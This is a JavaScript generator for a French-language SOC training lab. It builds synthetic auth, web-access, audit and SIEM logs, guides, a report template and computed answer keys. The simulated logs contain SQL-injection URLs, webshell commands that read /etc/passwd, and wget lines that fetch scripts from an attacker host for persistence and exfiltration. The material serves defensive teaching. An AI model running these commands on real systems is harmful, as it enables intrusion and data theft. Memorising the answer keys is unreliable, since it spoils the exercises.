// Deterministic scenarios for the Linux audit and SOC investigation labs.
// Every file is generated from structured events and every expected answer (the "facts") is computed
// from those events, so the lab files served to learners and the answer keys can never drift apart.
// Used by scripts/generate-lab-assets.cjs.

const SOC_EPOCH = Date.UTC(2026, 3, 2, 0, 0, 0) / 1000;
const text = (value) => Buffer.from(value, "utf8");
const two = (value) => String(value).padStart(2, "0");

function mulberry32(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const at = (second) => new Date((SOC_EPOCH + second) * 1000);
const clock = (second) => `${two(at(second).getUTCHours())}:${two(at(second).getUTCMinutes())}:${two(at(second).getUTCSeconds())}`;
const isoStamp = (second) => at(second).toISOString().replace(/\.\d{3}Z$/, "Z");
const syslogStamp = (second) => `Apr ${String(at(second).getUTCDate()).padStart(2, " ")} ${clock(second)}`;
const clf = (second) => `02/Apr/2026:${clock(second)} +0000`;
const hms = (hours, minutes, seconds = 0) => hours * 3600 + minutes * 60 + seconds;
const pick = (random, items) => items[Math.floor(random() * items.length)];
const between = (random, low, high) => low + Math.floor(random() * (high - low + 1));

// --- SSH brute force: auth.log ---------------------------------------------------------------------------

function buildAuthLog() {
  const random = mulberry32(20260402);
  const host = "web-srv01";
  const attacker = "203.0.113.45";
  const scanner = "192.0.2.88";
  const adminWorkstation = "10.20.0.5";
  const events = [];
  const add = (second, process, message, tag = "") => events.push({ second, process, pid: between(random, 1200, 9800), message, tag });

  // Normal activity: hourly cron and the administrator's key-based logins.
  for (let hour = 0; hour < 6; hour += 1) {
    add(hms(hour, 17), "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)");
    add(hms(hour, 17, 1), "CRON", "pam_unix(cron:session): session closed for user root");
  }
  [[0, 41], [1, 52], [4, 9], [5, 33]].forEach(([hour, minute]) => {
    const second = hms(hour, minute, between(random, 0, 50));
    const port = between(random, 40000, 60000);
    add(second, "sshd", `Accepted publickey for deploy from ${adminWorkstation} port ${port} ssh2: RSA SHA256:q3Zk1x0Yh8mP4rT7uWc2LdN6aVbE5sGj9oIf0HnKXyA`);
    add(second, "sshd", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)");
    add(second + between(random, 200, 900), "sshd", "pam_unix(sshd:session): session closed for user deploy");
  });

  // A low-volume scanner that never gets in: it must not be mistaken for the real attack.
  for (let attempt = 0; attempt < 3; attempt += 1) {
    add(hms(1, 58, attempt * 4), "sshd", `Failed password for root from ${scanner} port ${between(random, 30000, 60000)} ssh2`, "scanner");
  }
  add(hms(1, 58, 15), "sshd", `Connection closed by authenticating user root ${scanner} port ${between(random, 30000, 60000)} [preauth]`);

  // The attack: guessed account names first, then the real account "deploy", then a login.
  const invalidUsers = ["admin", "test", "oracle", "ubuntu", "postgres", "ftpuser", "git", "guest", "user", "nagios"];
  let second = hms(2, 14, 7);
  invalidUsers.forEach((user) => {
    const port = between(random, 41000, 52000);
    add(second, "sshd", `Invalid user ${user} from ${attacker} port ${port}`, "attack");
    add(second + 1, "sshd", `Failed password for invalid user ${user} from ${attacker} port ${port} ssh2`, "attack");
    add(second + 2, "sshd", `Failed password for invalid user ${user} from ${attacker} port ${port + 1} ssh2`, "attack");
    second += between(random, 3, 5);
  });
  for (let attempt = 0; attempt < 24; attempt += 1) {
    add(second, "sshd", `Failed password for deploy from ${attacker} port ${between(random, 52000, 60000)} ssh2`, "attack");
    second += between(random, 2, 4);
  }
  second += 6;
  const successSecond = second;
  add(second, "sshd", `Accepted password for deploy from ${attacker} port 53311 ssh2`, "success");
  add(second, "sshd", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)");
  add(second + 1, "systemd-logind", "New session 41 of user deploy.");
  add(second + 24, "sudo", "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash", "post");
  add(second + 24, "sudo", "pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)");
  add(second + 61, "useradd", "new group: name=support, GID=1002", "post");
  add(second + 61, "useradd", "new user: name=support, UID=1002, GID=1002, home=/home/support, shell=/bin/bash", "post");
  add(second + 63, "usermod", "add 'support' to group 'sudo'", "post");
  add(second + 70, "passwd", "pam_unix(passwd:chauthtok): password changed for support", "post");
  add(second + 96, "sshd", "pam_unix(sshd:session): session closed for user deploy");

  events.sort((a, b) => a.second - b.second);
  const lines = events.map((event) => `${syslogStamp(event.second)} ${host} ${event.process}[${event.pid}]: ${event.message}`);
  const failed = (event) => event.message.startsWith("Failed password") && event.message.includes(` from ${attacker} `);
  const attackerFailures = events.filter(failed);
  const targets = events.filter((event) => failed(event) && !event.message.includes("invalid user"));
  const invalidTried = new Set(events.filter((event) => event.message.startsWith("Invalid user") && event.message.includes(attacker)).map((event) => event.message.split(" ")[2]));
  const accepted = events.find((event) => event.tag === "success");
  const created = events.find((event) => event.message.startsWith("new user:"));

  return {
    file: text(`${lines.join("\n")}\n`),
    facts: {
      attackerIp: attacker,
      host,
      attackerFailures: attackerFailures.length,
      invalidUserCount: invalidTried.size,
      targetedUser: "deploy",
      targetedAttempts: targets.length,
      firstAttackTime: clock(events.find((event) => event.message.includes(attacker)).second),
      successTime: clock(accepted.second),
      authMethod: accepted.message.split(" ")[1],
      attackDurationSeconds: accepted.second - events.find((event) => event.message.includes(attacker)).second,
      newUser: created.message.match(/name=([a-z]+)/)[1],
      newUserGroup: "sudo",
      scannerIp: scanner,
      scannerFailures: events.filter((event) => event.tag === "scanner").length,
      lineCount: lines.length,
    },
  };
}

// --- Web intrusion: access.log -----------------------------------------------------------------------------

function buildWebLog() {
  const random = mulberry32(20260403);
  const attacker = "198.51.100.23";
  const decoy = "192.0.2.77";
  const events = [];
  const add = (second, ip, method, target, status, size, agent, tag = "") => events.push({ second, ip, method, target, status, size, agent, tag });
  const browsers = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Android 13; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
  ];

  // Normal visitors.
  const visitors = ["192.0.2.10", "192.0.2.31", "192.0.2.56", "192.0.2.64", "192.0.2.120"];
  const pages = [["/", 5120], ["/produits.php?id=1", 2480], ["/produits.php?id=2", 2310], ["/produits.php?id=3", 2655], ["/contact", 1810], ["/static/app.css", 14200], ["/static/logo.png", 8433]];
  for (let second = hms(3, 20); second < hms(4, 25); second += between(random, 25, 70)) {
    const [target, size] = pick(random, pages);
    add(second, pick(random, visitors), "GET", target, random() < 0.1 ? 304 : 200, size, pick(random, browsers));
  }
  [hms(3, 52, 10), hms(3, 52, 31), hms(3, 53, 2)].forEach((second, index) => add(second, decoy, "GET", ["/contcat", "/produit", "/aide"][index], 404, 153, browsers[0], "decoy"));

  // Phase 1: reconnaissance with an automated scanner.
  const scanTargets = [
    ["/admin", 404], ["/phpmyadmin/", 404], ["/.env", 404], ["/.git/config", 404], ["/backup.zip", 404], ["/wp-login.php", 404], ["/administrator/", 404],
    ["/config.php.bak", 404], ["/server-status", 403], ["/test.php", 404], ["/db.sql", 404], ["/old/", 404], ["/login", 404], ["/admin/login.php", 200],
  ];
  let second = hms(3, 41, 7);
  scanTargets.forEach(([target, status]) => {
    add(second, attacker, "GET", target, status, status === 200 ? 1904 : 153, "Nikto/2.5.0", "scan");
    second += between(random, 1, 3);
  });

  // Phase 2: SQL injection against the product page, driven by sqlmap.
  const agent = "sqlmap/1.7.2#stable (https://sqlmap.org)";
  const injections = [
    ["/produits.php?id=3%27", 500, 540],
    ["/produits.php?id=3%20OR%201%3D1", 200, 9120],
    ["/produits.php?id=3%20AND%201%3D2", 200, 310],
    ["/produits.php?id=3%20ORDER%20BY%204--", 200, 2655],
    ["/produits.php?id=3%20ORDER%20BY%205--", 500, 540],
    ["/produits.php?id=-1%20UNION%20SELECT%201,2,3,4--", 200, 2670],
    ["/produits.php?id=-1%20UNION%20SELECT%20table_name,2,3,4%20FROM%20information_schema.tables--", 200, 3894],
    ["/produits.php?id=-1%20UNION%20SELECT%20username,password,3,4%20FROM%20users--", 200, 4120],
  ];
  second = hms(3, 47, 40);
  injections.forEach(([target, status, size]) => {
    add(second, attacker, "GET", target, status, size, agent, "sqli");
    second += between(random, 2, 6);
  });

  // Phase 3: administrator login with the stolen password, upload, then the webshell.
  const firefox = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0";
  add(hms(3, 55, 12), attacker, "POST", "/admin/login.php", 302, 0, firefox, "login");
  add(hms(3, 55, 15), attacker, "GET", "/admin/dashboard.php", 200, 7311, firefox);
  add(hms(3, 56, 2), attacker, "POST", "/admin/upload.php", 200, 412, firefox, "upload");
  const shell = "/uploads/shell.php";
  [["", 200, 24], ["?cmd=id", 200, 54], ["?cmd=whoami", 200, 9], ["?cmd=ls%20-la%20/var/www", 200, 612], ["?cmd=cat%20/etc/passwd", 200, 1830], ["?cmd=wget%20http://198.51.100.23:8000/rev.sh", 200, 0]].forEach(([query, status, size], index) => {
    add(hms(3, 56, 30) + index * 17, attacker, "GET", `${shell}${query}`, status, size, firefox, "shell");
  });

  events.sort((a, b) => a.second - b.second);
  const lines = events.map((event) => `${event.ip} - - [${clf(event.second)}] "${event.method} ${event.target} HTTP/1.1" ${event.status} ${event.size} "-" "${event.agent}"`);
  const mine = events.filter((event) => event.ip === attacker);
  const shellHits = events.filter((event) => event.target.startsWith(shell));
  const sqli = events.filter((event) => event.tag === "sqli");

  return {
    file: text(`${lines.join("\n")}\n`),
    facts: {
      attackerIp: attacker,
      firstTool: "nikto",
      requestsFromAttacker: mine.length,
      notFoundFromAttacker: mine.filter((event) => event.status === 404).length,
      vulnerablePage: "/produits.php",
      injectionRequests: sqli.length,
      unionRequests: sqli.filter((event) => event.target.includes("UNION")).length,
      firstInjectionTime: clock(sqli[0].second),
      loginTime: clock(events.find((event) => event.tag === "login").second),
      webshellPath: shell,
      webshellRequests: shellHits.length,
      firstCommandTime: clock(shellHits.find((event) => event.target.includes("?cmd=")).second),
      decoyIp: decoy,
      lineCount: lines.length,
    },
  };
}

// --- Linux audit bundle ---------------------------------------------------------------------------------------

function buildLinuxAudit() {
  const host = "srv-compta01";
  const risky = "/opt/scripts/backup.sh";
  const normalSuid = ["/usr/bin/passwd", "/usr/bin/sudo", "/usr/bin/su", "/usr/bin/mount", "/usr/bin/umount", "/usr/bin/chsh", "/usr/bin/chfn", "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/bin/ping"];
  const rogueSuid = "/usr/bin/find";
  const suidList = [...normalSuid.slice(0, 5), rogueSuid, ...normalSuid.slice(5)];
  const passwd = [
    "root:x:0:0:root:/root:/bin/bash",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
    "sshd:x:110:65534::/run/sshd:/usr/sbin/nologin",
    "deploy:x:1001:1001:Deploy,,,:/home/deploy:/bin/bash",
    "devops:x:1002:1002:DevOps,,,:/home/devops:/bin/bash",
    "toor:x:0:0:backup admin:/root:/bin/bash",
    "compta:x:1003:1003:Comptabilite,,,:/home/compta:/bin/bash",
  ];
  const sudoers = [
    ["/etc/sudoers.d/90-cloud-init", "%sudo ALL=(ALL:ALL) ALL"],
    ["/etc/sudoers.d/devops", "devops ALL=(ALL) NOPASSWD: ALL"],
    ["/etc/sudoers.d/compta", "compta ALL=(root) /usr/bin/systemctl restart compta-api"],
  ];
  const listing = [
    ["-rwxr-xr-x", "root", "root", 1043, "Mar 28 09:12", "/opt/scripts/deploy.sh"],
    ["-rwxrwxrwx", "root", "root", 388, "Mar 30 22:47", risky],
    ["-rw-r-----", "root", "adm", 20480, "Apr  1 06:25", "/var/log/auth.log"],
    ["-rw-------", "root", "root", 1760, "Mar 12 14:03", "/etc/ssh/ssh_host_rsa_key"],
    ["-rw-r--r--", "root", "root", 1912, "Apr  1 18:40", "/etc/passwd"],
    ["-rw-r-----", "root", "shadow", 1210, "Apr  1 18:40", "/etc/shadow"],
  ];
  const cron = [
    "# m h dom mon dow command",
    "0 2 * * * /opt/scripts/deploy.sh --nightly >> /var/log/deploy.log 2>&1",
    `*/10 * * * * ${risky}`,
    "30 3 * * 0 /usr/bin/apt-get -y -qq update",
  ];
  const octal = (mode) => mode.slice(1).match(/.{3}/g).map((triplet) => [...triplet].reduce((sum, char, index) => sum + (char === "-" ? 0 : [4, 2, 1][index]), 0)).join("");

  const out = [];
  out.push(`### CyberPingo, audit Linux de ${host}, collecte du ${isoStamp(hms(8, 30))}`);
  out.push("### Collecte en lecture seule. Aucune modification n’a été faite sur le serveur.");
  out.push("");
  out.push("=== ls -l (fichiers de configuration et scripts) ===");
  listing.forEach(([mode, owner, group, size, date, path]) => out.push(`${mode} 1 ${owner} ${group} ${String(size).padStart(6, " ")} ${date} ${path}`));
  out.push("");
  out.push("=== find / -perm -4000 -type f 2>/dev/null ===");
  suidList.forEach((path) => out.push(path));
  out.push("");
  out.push("=== cat /etc/sudoers.d/* ===");
  sudoers.forEach(([file, rule]) => { out.push(`# ${file}`); out.push(rule); });
  out.push("");
  out.push("=== crontab -l -u root ===");
  cron.forEach((line) => out.push(line));
  out.push("");
  out.push("=== cat /etc/passwd ===");
  passwd.forEach((line) => out.push(line));
  out.push("");
  out.push("=== awk -F: '$3 == 0 {print $1}' /etc/passwd ===");
  const uidZero = passwd.filter((line) => line.split(":")[2] === "0").map((line) => line.split(":")[0]);
  uidZero.forEach((name) => out.push(name));
  out.push("");
  out.push("### Fin de collecte, 5 sections");

  const writable = listing.find(([mode]) => mode.endsWith("rwx") && mode.slice(7) === "rwx");
  return {
    file: text(`${out.join("\n")}\n`),
    facts: {
      host,
      worldWritableScript: writable[5],
      worldWritableMode: octal(writable[0]),
      scriptOwner: writable[1],
      cronSchedule: "*/10 * * * *",
      cronUser: "root",
      suidCount: suidList.length,
      suidUnexpected: rogueSuid,
      sudoUser: "devops",
      sudoRule: "NOPASSWD: ALL",
      uidZeroAccounts: uidZero.length,
      extraRootAccount: uidZero.find((name) => name !== "root"),
      lineCount: out.length,
    },
  };
}

// --- Consolidated incident: SIEM-style log -----------------------------------------------------------------

function buildIncidentLog() {
  const random = mulberry32(20260404);
  const attacker = "203.0.113.166";
  const webHost = "web-srv01";
  const webIp = "10.20.0.15";
  const events = [];
  const add = (second, host, service, message, tag = "") => events.push({ second, host, service, message, tag });
  const wsPid = () => between(random, 400, 900);

  // Background noise: legitimate visits, the administrator's internal login and scheduled jobs.
  const visitors = ["192.0.2.14", "192.0.2.40", "192.0.2.93", "192.0.2.150"];
  const pages = ["GET / HTTP/1.1", "GET /produits HTTP/1.1", "GET /contact HTTP/1.1", "GET /static/app.css HTTP/1.1"];
  for (let second = hms(0, 5); second < hms(3, 0); second += between(random, 40, 110)) {
    add(second, webHost, "nginx", `${pick(random, visitors)} "${pick(random, pages)}" 200 auth=NONE`);
  }
  for (let hour = 0; hour < 3; hour += 1) {
    add(hms(hour, 0, 1), webHost, "CRON", "(root) CMD (/usr/local/bin/rotate-logs.sh)");
    add(hms(hour, 30, 1), webHost, "CRON", "(www-data) CMD (php /var/www/html/artisan schedule:run)");
  }
  add(hms(1, 5, 12), webHost, "nginx", `10.20.0.5 "POST /admin/login HTTP/1.1" 302 auth=SUCCESS user=admin`);
  add(hms(1, 40, 44), webHost, "sshd", `Accepted publickey for deploy from 10.20.0.5 port ${between(random, 40000, 60000)} ssh2`);
  add(hms(1, 47, 3), "fw01", "ufw", `ALLOW OUT SRC=${webIp} DST=192.0.2.200 PROTO=TCP SPT=${between(random, 40000, 60000)} DPT=443 LEN=${between(random, 400, 900)}`);
  add(hms(1, 52, 9), webHost, "sshd", `Failed password for root from 192.0.2.201 port ${between(random, 30000, 60000)} ssh2`, "decoy");

  // Stage 1: password guessing on the web administration panel.
  let second = hms(2, 9, 55);
  for (let attempt = 0; attempt < 14; attempt += 1) {
    add(second, webHost, "nginx", `${attacker} "POST /admin/login HTTP/1.1" 401 auth=FAILED user=admin`, "bruteforce");
    second += between(random, 2, 5);
  }
  const loginSecond = second + 4;
  add(loginSecond, webHost, "nginx", `${attacker} "POST /admin/login HTTP/1.1" 302 auth=SUCCESS user=admin`, "login");

  // Stage 2: web shell upload and execution as www-data.
  const uploadSecond = loginSecond + 94;
  add(uploadSecond, webHost, "nginx", `${attacker} "POST /admin/upload HTTP/1.1" 200 auth=SUCCESS user=admin file=thumb.php`, "upload");
  const shellSecond = uploadSecond + 37;
  ["", "?c=id", "?c=ls+/var/www/html", "?c=cat+/var/www/html/config.php"].forEach((query, index) => {
    add(shellSecond + index * 21, webHost, "nginx", `${attacker} "GET /media/thumb.php${query} HTTP/1.1" 200 auth=NONE`, "shell");
  });
  add(shellSecond + 63, webHost, "auditd", "type=OPEN uid=33(www-data) exe=/usr/bin/php file=/var/www/html/config.php", "shell");

  // Stage 3: the stolen database credentials are reused over SSH (lateral movement).
  const pivotSecond = shellSecond + 63 + 8 * 60 + 14;
  add(pivotSecond, webHost, "sshd", `Accepted password for dbadmin from ${attacker} port 49822 ssh2`, "pivot");
  add(pivotSecond + 1, webHost, "sshd", "pam_unix(sshd:session): session opened for user dbadmin(uid=1004) by (uid=0)");
  add(pivotSecond + 52, webHost, "bash", "dbadmin: wget -q http://203.0.113.166:8000/sync.sh -O /tmp/.sync.sh && chmod +x /tmp/.sync.sh", "post");
  add(pivotSecond + 71, webHost, "crontab", "(dbadmin) BEGIN EDIT (dbadmin)", "persist");
  add(pivotSecond + 84, webHost, "crontab", "(dbadmin) REPLACE (dbadmin)", "persist");

  // Stage 4: the persistence job runs every 10 minutes and uploads data to the attacker.
  const firstCron = Math.ceil((pivotSecond + 90) / 600) * 600 + 1;
  const exfil = [];
  for (let run = 0; run < 4; run += 1) {
    const base = firstCron + run * 600;
    add(base, webHost, "CRON", "(dbadmin) CMD (/tmp/.sync.sh)", "cron");
    const bytes = between(random, 40, 90) * 1048576 + between(random, 0, 1048575);
    exfil.push({ second: base + 11, bytes });
    add(base + 11, "fw01", "ufw", `ALLOW OUT SRC=${webIp} DST=${attacker} PROTO=TCP SPT=${between(random, 40000, 60000)} DPT=8443 LEN=${bytes}`, "exfil");
  }

  events.sort((a, b) => a.second - b.second);
  const lines = events.map((event) => `${isoStamp(event.second)} ${event.host} ${event.service}[${wsPid()}]: ${event.message}`);
  const failed = events.filter((event) => event.tag === "bruteforce");
  const firstExfil = exfil[0];
  const firstAttack = events.find((event) => event.message.includes(attacker));

  return {
    file: text(`${lines.join("\n")}\n`),
    facts: {
      attackerIp: attacker,
      webHost,
      failedLogins: failed.length,
      compromisedWebAccount: "admin",
      firstAttackTime: isoStamp(firstAttack.second).slice(11, 19),
      loginTime: clock(loginSecond),
      uploadTime: clock(uploadSecond),
      webshellPath: "/media/thumb.php",
      stolenFile: "config.php",
      pivotAccount: "dbadmin",
      pivotTime: clock(pivotSecond),
      pivotProtocol: "ssh",
      persistenceMethod: "crontab",
      persistenceFile: "/tmp/.sync.sh",
      exfilPort: 8443,
      exfilConnections: exfil.length,
      firstExfilTime: clock(firstExfil.second),
      lineCount: lines.length,
    },
  };
}

// --- Guides and report template ---------------------------------------------------------------------------

function buildLinuxGuide() {
  return text(`# Guide de l’audit Linux

Ce guide accompagne le laboratoire d’audit des droits. Il résume les commandes à connaître et la façon de lire leur résultat.

## 1. Lire une ligne ls -l

\`\`\`
-rwxr-xr-x 1 root root 1043 Mar 28 09:12 /opt/scripts/deploy.sh
\`\`\`

| Zone | Exemple | Sens |
|---|---|---|
| Type | - | fichier ordinaire (d = dossier, l = lien) |
| Propriétaire | rwx | lecture, écriture, exécution |
| Groupe | r-x | lecture et exécution |
| Autres | r-x | lecture et exécution |

Chaque droit vaut un nombre : r = 4, w = 2, x = 1. On additionne par groupe : rwx = 7, r-x = 5, r-- = 4. Le mode rwxr-xr-x s’écrit donc 755.

## 2. Ce qui doit alerter

- Un droit d’écriture pour « autres » (le dernier groupe) sur un script : n’importe quel compte peut le modifier.
- Un script modifiable par tous et lancé par le cron de root : c’est une escalade de privilèges.
- Un bit SUID (un s à la place du x du propriétaire) sur un outil qui sait lancer des commandes, comme find.
- Une règle sudoers NOPASSWD: ALL : un simple compte devient root sans mot de passe.
- Un second compte avec l’identifiant 0 dans /etc/passwd : il est root de fait.

## 3. Commandes de vérification

\`\`\`
find / -perm -4000 -type f 2>/dev/null     # fichiers SUID
find / -perm -002 -type f 2>/dev/null      # fichiers modifiables par tous
awk -F: '$3 == 0 {print $1}' /etc/passwd   # comptes root
sudo -l -U utilisateur                     # droits sudo d’un compte
crontab -l -u root                         # tâches planifiées de root
\`\`\`

## 4. Méthode

1. Repérer ce qui sort de l’ordinaire par rapport à un système sain.
2. Noter la preuve (chemin, ligne, compte) pour chaque anomalie.
3. Évaluer l’impact : qui peut exploiter cela, avec quels droits ?
4. Proposer une correction : chmod, retrait du SUID, règle sudoers plus stricte, suppression du compte.
`);
}

function buildLogReadingGuide() {
  return text(`# Guide de lecture des journaux

Ce guide sert aux laboratoires d’analyse de journaux et d’investigation. Utilise le champ de filtre du lecteur : plusieurs termes se combinent (ET), et un terme précédé de - est exclu.

## Journaux d’authentification SSH (auth.log)

| Motif | Signification |
|---|---|
| Failed password for X from IP | échec de mot de passe |
| Invalid user X from IP | compte inexistant, souvent un balayage automatique |
| Accepted password / publickey for X | connexion réussie |
| sudo: X : COMMAND=... | commande lancée avec les droits de root |
| useradd, usermod | création ou modification de compte |

Une attaque par force brute suit souvent la même suite : des comptes inconnus, puis un compte réel, puis un succès. Cherche la première ligne Accepted venant de l’IP qui échoue.

## Journaux web (format combiné d’Apache)

\`\`\`
IP - - [date] "MÉTHODE /chemin HTTP/1.1" statut taille "referer" "agent"
\`\`\`

- Une rafale de statuts 404 sur des chemins courants (admin, .env, backup) indique un scan.
- UNION SELECT, OR 1=1 ou une apostrophe dans l’URL indiquent une injection SQL.
- Un fichier .php dans un dossier d’envoi, appelé avec ?cmd= ou ?c=, est presque toujours un webshell.
- L’agent utilisateur (Nikto, sqlmap) nomme souvent l’outil de l’attaquant.

## Journaux consolidés (SIEM)

Chaque ligne commence par une date ISO 8601 en UTC, puis la machine et le service. La date permet de remettre en ordre des événements venus de sources différentes. Les motifs FAILED, SUCCESS, ALLOW et DENY sont colorés dans le lecteur.

## Réflexes

- Filtrer d’abord par IP, puis par compte, puis par heure.
- Distinguer le bruit (visiteurs, tâches planifiées) de l’attaque.
- Écrire la chronologie au fur et à mesure : heure, source, action, preuve.
`);
}

function buildIncidentTemplate() {
  return text(`# Rapport d’incident

Nom :
Date :

## 1. Résumé

En deux ou trois phrases : ce qui s’est passé, quand, et avec quel impact.

## 2. Chronologie (UTC)

| Heure | Source | Événement | Preuve (ligne du journal) |
|---|---|---|---|
| | | | |
| | | | |
| | | | |

## 3. Analyse

- Vecteur d’entrée initial :
- Comptes compromis :
- Déplacement latéral :
- Persistance :
- Données exposées ou exfiltrées :

## 4. Indicateurs de compromission

| Type | Valeur |
|---|---|
| Adresse IP | |
| Compte | |
| Fichier | |
| Port | |

## 5. Actions de remédiation

1. Contenir : bloquer l’IP, désactiver les comptes concernés.
2. Éradiquer : supprimer le webshell et la tâche planifiée.
3. Rétablir : changer les secrets exposés, restaurer depuis une sauvegarde saine.
4. Prévenir : limiter les tentatives de connexion, séparer les comptes, surveiller les sorties réseau.

## 6. Leçons apprises

Ce qui a bien fonctionné, ce qui a manqué, ce qu’il faut changer.
`);
}

// --- Public entry point -----------------------------------------------------------------------------------

function buildSocAssets() {
  const audit = buildLinuxAudit();
  const auth = buildAuthLog();
  const web = buildWebLog();
  const incident = buildIncidentLog();
  return {
    files: [
      { name: "audit-linux-serveur.log", data: audit.file },
      { name: "auth-ssh-web-srv01.log", data: auth.file },
      { name: "access-web-boutique.log", data: web.file },
      { name: "incident-consolide-soc.log", data: incident.file },
      { name: "guide-audit-linux.md", data: buildLinuxGuide() },
      { name: "guide-lecture-journaux.md", data: buildLogReadingGuide() },
      { name: "modele-rapport-incident.md", data: buildIncidentTemplate() },
    ],
    facts: { audit: audit.facts, ssh: auth.facts, web: web.facts, incident: incident.facts },
  };
}

module.exports = { buildSocAssets };
